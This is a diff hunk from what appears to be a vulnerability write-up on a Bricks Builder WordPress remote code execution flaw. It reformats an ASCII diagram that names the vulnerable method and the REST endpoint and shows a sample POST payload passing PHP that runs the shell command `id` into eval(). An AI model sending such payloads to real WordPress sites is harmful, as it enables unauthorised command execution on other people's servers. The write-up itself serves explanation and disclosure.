@@ -125,19 +125,19 @@ var bricksData = {
 The vulnerability exists in the `prepare_query_vars_from_settings` method where user input is passed directly to PHP's `eval()` function through the REST API endpoint `/wp-json/bricks/v1/render_element`.
 
 ```
-┌─────────────────────────────────────────────────────────────────┐
-│  Attacker                                                       │
-│     │                                                           │
-│     │ POST /wp-json/bricks/v1/render_element                    │
-│     │ {"nonce":"xxx", "element":{"settings":{"queryEditor":     │
-│     │   "throw new Exception(`id`);"}} }                        │
-│     ▼                                                           │
-│  WordPress + Bricks Builder                                     │
-│     │                                                           │
-│     │ eval($user_controlled_input)  ← 💀 RCE!                   │
-│     ▼                                                           │
-│  Command Execution as www-data/apache                           │
-└─────────────────────────────────────────────────────────────────┘
+┌────────────────────────────────────────────────────────────────┐
+│  Attacker                                                      │
+│     │                                                          │
+│     │ POST /wp-json/bricks/v1/render_element                   │
+│     │ {"nonce":"xxx", "element":{"settings":{"queryEditor":    │
+│     │   "throw new Exception(`id`);"}} }                       │
+│     ▼                                                          │
+│  WordPress + Bricks Builder                                    │
+│     │                                                          │
+│     │ eval($user_controlled_input)  ← RCE!                     |
+│     ▼                                                          │
+│  Command Execution as www-data/apache                          │
+└────────────────────────────────────────────────────────────────┘
 ```
 
 ### 2.2 Exploit Execution
